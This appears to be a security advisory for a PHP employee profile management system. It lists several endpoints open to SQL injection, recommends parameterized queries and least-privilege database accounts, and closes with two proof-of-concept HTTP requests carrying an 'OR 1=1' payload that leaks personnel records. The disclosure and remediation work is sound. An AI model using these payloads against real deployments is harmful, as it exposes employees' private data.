# employee-management-SQL
Proof-of-Concept and Advisory for Employee Profile Management System SQLi

# Vulnerability Advisory & Exploit

## Affected Version

**Employee Profile Management System in PHP**

---

## Vulnerability Type

**SQL Injection** in multiple endpoints:

edit_personnel.php (parameter per_id)

view_personnel.php (parameter per_id)

print_personnel_report.php (parameter term)

file_table.php (parameter term)

delete_department.php (parameter dept_id)

delete_personnel.php (parameter per_id)

delete_position.php (likely position ID parameter)

delete_rank.php (likely rank ID parameter)

These scripts build SQL strings by concatenating user-controlled parameters (per_id, dept_id, term, etc.) into the query and then calling PDO::prepare() without using ? placeholders and bound parameters. As a result, the “prepared” statement is still fully injectable.

---

## Advisory (Recommendations)

### Use proper parameterized queries

Replace string concatenation like:

      $sql = "SELECT * FROM personnel WHERE per_id = " . $_GET['per_id'];
      $stmt = $pdo->prepare($sql);
      $stmt->execute();


with:

      $stmt = $pdo->prepare("SELECT * FROM personnel WHERE per_id = :per_id");
      $stmt->execute([':per_id' => $_GET['per_id']]);


Apply this to all affected files (edit_personnel.php, view_personnel.php, print_personnel_report.php, file_table.php, delete_*.php).

### Enforce strict input validation & type checking

  per_id, dept_id, and similar IDs should be integers only (e.g. ctype_digit() / casts plus rejection on failure).

  term should be validated against a whitelist (e.g. allowed year, semester, or term codes).

### Limit database privileges

  Use a dedicated DB user with only the minimal privileges required.

  Separate accounts for read-only operations (view/report) and write/delete operations.

### Add centralized query helper layer

  Wrap all DB access through a small helper function enforcing parameterized queries and validation.

  Avoid inline SQL wherever possible.

---  

## Proof-of-Concept (Exploit)

The following PoCs assume the application is running locally at:
http://localhost/employee_profile/
Adjust the base path to match your deployment.

### 1. Data Extraction via per_id in view_personnel.php

**Vulnerable pattern (conceptual)**:

      // view_personnel.php
      $per_id = $_GET['per_id']; // no validation
      $sql = "SELECT * FROM personnel WHERE per_id = " . $per_id;
      $stmt = $pdo->prepare($sql);
      $stmt->execute();


**HTTP Request (GET)**

This payload turns the WHERE clause into a tautology and can leak multiple personnel records:

      GET /employee_profile/view_personnel.php?per_id=1%27%20OR%201=1--%20 HTTP/1.1
      Host: localhost
      User-Agent: Mozilla/5.0
      Accept: */*
      Connection: close
      

**Expected effect**:

Instead of showing only the record for per_id = 1, the page will list all personnel records (or at least more than one), proving SQL injection via per_id.

### 2. Data Extraction via per_id in edit_personnel.php

If edit_personnel.php loads the existing record using per_id similarly, the same payload can be reused.

**HTTP Request (GET)**

    GET /employee_profile/edit_personnel.php?per_id=1%27%20OR%201=1--%20 HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0
    Accept: */*
    Connection: close


**Verification**:

If the edit form shows information for multiple users or crashes with a SQL error containing your injected fragment, the injection is confirmed.

